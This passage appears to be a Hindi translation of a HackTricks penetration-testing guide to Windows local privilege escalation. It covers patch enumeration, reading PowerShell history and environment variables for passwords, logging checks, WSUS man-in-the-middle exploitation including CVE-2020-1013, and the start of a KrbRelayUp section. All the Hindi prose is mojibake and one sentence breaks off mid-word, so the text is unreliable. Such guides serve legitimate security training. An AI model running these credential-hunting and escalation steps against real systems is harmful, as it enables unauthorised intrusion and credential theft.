# Windows рд╕реНрдерд╛рдиреАрдп рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдЙрдиреНрдирдпрди

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ**

</details>

### **Windows рд╕реНрдерд╛рдиреАрдп рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдЙрдиреНрдирдпрди рдХреЗ рд▓рд┐рдП рд╕рд░реНрд╡рд╢реНрд░реЗрд╖реНрда рдЙрдкрдХрд░рдг:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## рдкреНрд░рд╛рд░рдВрднрд┐рдХ Windows рд╕рд┐рджреНрдзрд╛рдВрдд

### рдкрд╣реБрдВрдЪ рдЯреЛрдХрди

**рдЕрдЧрд░ рдЖрдкрдХреЛ рдкрддрд╛ рдирд╣реАрдВ рд╣реИ рдХрд┐ Windows рдкрд╣реБрдВрдЪ рдЯреЛрдХрди рдХреНрдпрд╛ рд╣реИ, рддреЛ рдЖрдЧреЗ рдмрдврд╝рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреЛ рдкрдврд╝реЗрдВ:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░

**рдЕрдЧрд░ рдЖрдкрдХреЛ рдирд╣реАрдВ рдкрддрд╛ рдХрд┐ Windows рдореЗрдВ рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░ рдХреНрдпрд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреЛ рдкрдврд╝рдирд╛ рдЪрд╛рд╣рд┐рдП:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windows рд╕реБрд░рдХреНрд╖рд╛ рдирд┐рдпрдВрддреНрд░рдг

Windows рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рдЪреАрдЬреЗрдВ рд╣реИрдВ рдЬреЛ **рдЖрдкрдХреЛ рд╕рд┐рд╕реНрдЯрдо рдХреА рдЬрд╛рдБрдЪ рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХ рд╕рдХрддреА рд╣реИрдВ**, рдХрд╛рд░реНрдпрдХреНрд░рдо рдЪрд▓рд╛ рд╕рдХрддреА рд╣реИрдВ рдпрд╛ рдпрд╣рд╛рдБ рддрдХ рдХрд┐ **рдЖрдкрдХреА рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЛ рдкрд╣рдЪрд╛рди рд╕рдХрддреА рд╣реИрдВ**ред рдЖрдкрдХреЛ **рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда** рдкрдврд╝рдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ **рдЗрди рд╕рднреА рд░рдХреНрд╖рд╛рдУрдВ** **рдХреЗ рддрдВрддреНрд░** рдХреА **рдЬрд╛рдБрдЪ** рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП **рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдЙрдиреНрдирдпрди** рд╢реБрд░реВ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ:

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## рд╕рд┐рд╕реНрдЯрдо рдЬрд╛рдирдХрд╛рд░реА

### рд╕рдВрд╕реНрдХрд░рдг рдЬрд╛рдирдХрд╛рд░реА рдЬрд╛рдБрдЪ

рдЬрд╛рдБрдЪ рдХрд░реЗрдВ рдХрд┐ Windows рд╕рдВрд╕реНрдХрд░рдг рдореЗрдВ рдХреЛрдИ рдЬреНрдЮрд╛рдд рд╕реБрд░рдХреНрд╖рд╛ рдЧрдбрд╝рдмрдбрд╝реА рд╣реИ (рд▓рд╛рдЧреВ рдХрд┐рдП рдЧрдП рдкреИрдЪреЛрдВ рдХреА рднреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ)ред
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### рд╕рдВрд╕реНрдХрд░рдг рд╢реЛрдз

рдпрд╣ [рд╕рд╛рдЗрдЯ](https://msrc.microsoft.com/update-guide/vulnerability) рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╡рд┐рд╕реНрддреГрдд рдЬрд╛рдирдХрд╛рд░реА рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИред рдЗрд╕ рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ 4,700 рд╕реЗ рдЕрдзрд┐рдХ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рд╣реИрдВ, рдЬреЛ рдПрдХ Windows рд╡рд╛рддрд╛рд╡рд░рдг рдХрд╛ **рд╡рд┐рд╢рд╛рд▓ рд╣рдорд▓реЗ рдХреНрд╖реЗрддреНрд░** рджрд░реНрд╢рд╛рддрд╛ рд╣реИред

**рд╕рд┐рд╕реНрдЯрдо рдкрд░**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas рдореЗрдВ watson рд╕рдорд╛рд╣рд┐рдд рд╣реИ)_

**рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рд╕рд┐рд╕реНрдЯрдо рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕ рдХреЗ Github рд░реЗрдкреЛ:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### рдкрд░реНрдпрд╛рд╡рд░рдг

рдХреНрдпрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓/рдорд╕рд╛рд▓реЗрджрд╛рд░ рдЬрд╛рдирдХрд╛рд░реА env variables рдореЗрдВ рд╕рд╣реЗрдЬреА рдЧрдИ рд╣реИ?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### PowerShell рдЗрддрд┐рд╣рд╛рд╕
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

рдЖрдк рдпрд╣ рдХреИрд╕реЗ рдЪрд╛рд▓реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЗрд╕реЗ [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) рдореЗрдВ рд╕реАрдЦ рд╕рдХрддреЗ рд╣реИрдВред
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### рдкрд╛рд╡рд░рд╢реЗрд▓ рдореЙрдбреНрдпреВрд▓ рд▓реЙрдЧрд┐рдВрдЧ

рдкрд╛рд╡рд░рд╢реЗрд▓ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреНрд░рд┐рдпрд╛рдПрдБ рджрд░реНрдЬ рдХреА рдЬрд╛рддреА рд╣реИрдВ, рдЬрд┐рд╕рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрдорд╛рдВрдб, рдХрдорд╛рдВрдб рдЖрдордВрддреНрд░рдг, рдФрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд╣рд┐рд╕реНрд╕реЗ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдкреВрд░реА рдирд┐рд╖реНрдкрд╛рджрди рд╡рд┐рд╡рд░рдг рдФрд░ рдЖрдЙрдЯрдкреБрдЯ рдкрд░рд┐рдгрд╛рдо рдХреЛ рд╢рд╛рдпрдж рд╣реА рдХреИрдкреНрдЪрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

рдЗрд╕реЗ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЗ "рдЯреНрд░рд╛рдВрд╕реНрдХреНрд░рд┐рдкреНрдЯ рдлрд╝рд╛рдЗрд▓" рдЦрдВрдб рдореЗрдВ рджрд┐рдП рдЧрдП рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ, **"рдкрд╛рд╡рд░рд╢реЗрд▓ рдЯреНрд░рд╛рдВрд╕реНрдХреНрд░рд┐рдкреНрд╢рди"** рдХреА рдмрдЬрд╛рдп **"рдореЙрдбреНрдпреВрд▓ рд▓реЙрдЧрд┐рдВрдЧ"** рдХрд╛ рдЪрдпрди рдХрд░реЗрдВред
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдХреЗ Powershell рд▓реЙрдЧ рд╕реЗ рдкрд┐рдЫрд▓реЗ 15 рдШрдЯрдирд╛рдУрдВ рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмреНрд▓реЙрдХ рд▓реЙрдЧрд┐рдВрдЧ**

рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреА рдкреВрд░реА рдЧрддрд┐рд╡рд┐рдзрд┐ рдФрд░ рд╕рд╛рдордЧреНрд░реА рд░рд┐рдХреЙрд░реНрдб рдХреЛ рджрд░реНрдЬ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕ рд╕реЗ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдкреНрд░рддреНрдпреЗрдХ рдХреЛрдб рдмреНрд▓реЙрдХ рдХреЛ рдЬрдм рд╡рд╣ рдЪрд▓рддрд╛ рд╣реИ, рдЙрд╕рдХреА рдкреВрд░реА рдЬрд╛рдирдХрд╛рд░реА рджрд░реНрдЬ рдХреА рдЧрдИ рд╣реИред рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдкреНрд░рддреНрдпреЗрдХ рдЧрддрд┐рд╡рд┐рдзрд┐ рдХрд╛ рд╡реНрдпрд╛рдкрдХ рдСрдбрд┐рдЯ рдЯреНрд░реЗрд▓ рдмрдирд╛рдП рд░рдЦрддреА рд╣реИ, рдЬреЛ рдлреЛрд░реЗрдВрд╕рд┐рдХреНрд╕ рдФрд░ рджреБрд░рд╛рдЪрд╛рд░реА рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХреЗ рд▓рд┐рдП рдореВрд▓реНрдпрд╡рд╛рди рд╣реИред рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд╕рдордп рд╕рднреА рдЧрддрд┐рд╡рд┐рдзрд┐ рдХреЛ рджрд░реНрдЬ рдХрд░рдХреЗ, рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╡рд┐рд╕реНрддреГрдд рдЕрдВрджрд░реВрдиреА рджреГрд╖реНрдЯрд┐рдХреЛрдг рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмреНрд▓реЙрдХ рдХреЗ рд▓рд┐рдП рд▓реЙрдЧрд┐рдВрдЧ рдШрдЯрдирд╛рдПрдВ рд╡рд┐рдВрдбреЛрдЬ рдЗрд╡реЗрдВрдЯ рд╡реНрдпреВрдЕрд░ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрде рдкрд░ рдЙрдкрд▓рдмреНрдз рд╣реЛ рд╕рдХрддреА рд╣реИрдВ: **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдФрд░ рд╕рд░реНрд╡рд┐рд╕ рд▓реЙрдЧреНрд╕ > рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ > рд╡рд┐рдВрдбреЛрдЬ > рдкрд╛рд╡рд░рд╢реЗрд▓ > рдСрдкрд░реЗрд╢рдирд▓**.\
рдкрд┐рдЫрд▓реЗ 20 рдШрдЯрдирд╛рдУрдВ рдХреЛ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗрдЯрд┐рдВрдЧреНрд╕
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### рдбреНрд░рд╛рдЗрд╡реНрд╕
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

рдЖрдк рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдЧрд░ рдЕрдкрдб
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
рдпрджрд┐ рдЖрдкрдХреЛ рдПрдХ рдЬрд╡рд╛рдм рдорд┐рд▓рддрд╛ рд╣реИ рдЬреИрд╕реЗ:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
рдФрд░ рдЕрдЧрд░ `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` `1` рдХреЗ рдмрд░рд╛рдмрд░ рд╣реИред

рддреЛ, **рдЗрд╕реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред** рдЕрдЧрд░ рдЕрдВрддрд┐рдо рд░рдЬрд┐рд╕реНрдЯреНрд░реА 0 рдХреЗ рдмрд░рд╛рдмрд░ рд╣реИ, рддреЛ WSUS рдПрдВрдЯреНрд░реА рдХреЛ рдирдЬрд░рдЕрдВрджрд╛рдЬ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдЗрди рд╡рдВрд╢рд╛рдиреБрдХреНрд░рдорд┐рддрддрд╛рдУрдВ рдХрд╛ рд╢реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- рдпреЗ MiTM рд╡реИрд╢реНрд╡рд┐рдХреАрдХреГрдд рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реИрдВ рдЬреЛ 'рдлреЗрдХ' рдЕрдкрдбреЗрдЯреНрд╕ рдХреЛ рдЧреИрд░-SSL WSUS рдЯреНрд░реИрдлрд┐рдХ рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рддреЗ рд╣реИрдВред

рдпрд╣рд╛рдБ рд╢реЛрдз рдкрдврд╝реЗрдВ:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**рдкреВрд░реА рд░рд┐рдкреЛрд░реНрдЯ рдпрд╣рд╛рдБ рдкрдврд╝реЗрдВ**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
рдореБрдЦреНрдп рд░реВрдк рд╕реЗ, рдпрд╣ рджреЛрд╖ рд╣реИ рдЬрд┐рд╕реЗ рдпрд╣ рдмрдЧ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░рддрд╛ рд╣реИ:

> рдЕрдЧрд░ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рд╣рдорд╛рд░реЗ рд╕реНрдерд╛рдиреАрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░реЙрдХреНрд╕реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рд╢рдХреНрддрд┐ рд╣реИ, рдФрд░ Windows рдЕрдкрдбреЗрдЯреНрд╕ рдЗрдВрдЯрд░рдиреЗрдЯ рдПрдХреНрд╕рдкреНрд▓реЛрд░рд░ рдХреА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХреА рдЧрдИ рдкреНрд░реЙрдХреНрд╕реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рд╣рдореЗрдВ рдЕрдкрдиреЗ рдПрд╕реЗрдЯ рдкрд░ рдЙрдЪреНрдЪ рд╕реНрддрд░реАрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЛрдб рдЪрд▓рд╛рдиреЗ рдХреА рд╢рдХреНрддрд┐ рд╣реЛрдЧреАред
>
> рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдХреНрдпреЛрдВрдХрд┐ WSUS рд╕реЗрд╡рд╛ рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИ, рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рднреА рдЗрд╕рдХреЗ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рд╕реНрдЯреЛрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ред рдЕрдЧрд░ рд╣рдо WSUS рд╣реЛрд╕реНрдЯрдирд╛рдо рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реНрд╡-рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЙрддреНрдкрдиреНрди рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХреЛ рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рд╕реНрдЯреЛрд░ рдореЗрдВ рдЬреЛрдбрд╝рддреЗ рд╣реИрдВ, рддреЛ рд╣рдо HTTP рдФрд░ HTTPS WSUS рдЯреНрд░реИрдлрд┐рдХ рджреЛрдиреЛрдВ рдХреЛ рдЕрдВрддрд░реНрджреГрд╖реНрдЯрд┐ рдХрд░ рд╕рдХреЗрдВрдЧреЗред WSUS рдПрдХ рднреА HSTS рдЬреИрд╕реЗ рддрдВрддреНрд░реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдкрд░ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд╣рд▓реА рдмрд╛рд░ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рдХрд╛рд░ рдХреА рдорд╛рдиреНрдпрддрд╛ рд▓рд╛рддрд╛ рд╣реИред рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдорд╛рдирд╛ рдЧрдпрд╛ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рд╕рд╣реА рд╣реЛрд╕реНрдЯрдирд╛рдо рд╣реИ, рддреЛ рд╕реЗрд╡рд╛ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдЖрдк рдЗрд╕ рджреЛрд╖ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрдкрдХрд░рдг [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЬрдм рдпрд╣ рдореБрдХреНрдд рд╣реЛрдЧрд╛)ред

## KrbRelayUp

рд╡рд┐рд╢реЗрд╖ рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЗ рддрд╣рдд Windows **рдбреЛрдореЗрди** рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдПрдХ **рд╕реНрдерд╛рдиреАрдп рд╡рд░реНрдЪрд╕реНрд╡ рдЙрдиреНрдирддрд┐** рджреЛрд╖ рдореМрдЬреВрдж рд╣реИред рдЗрди рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ: **LDAP рд╕рд╛рдЗрдирд┐рдВрдЧ рдирд╣реАрдВ рд▓рд╛рдЧреВ рд╣реИ,** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдкрд╛рд╕ рд╕реНрд╡-рдЕрдзрд┐рдХрд╛рд░ рд╣реИрдВ рдЬреЛ рдЙрдиреНрд╣реЗрдВ **рд╕рдВрд╕рд╛рдзрд┐рдд рдирд┐рд░реНрджреЗрд╢рди (RBCD) рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ,** рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдбреЛрдореЗрди рдХреЗ рднреАрддрд░ рдХрдВрдкреНрдпреВрдЯрд░ рдмрдирд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реИред рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдпреЗ **рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдБ** **рдбрд┐рдлрд╝реЙрд▓реНрдЯ 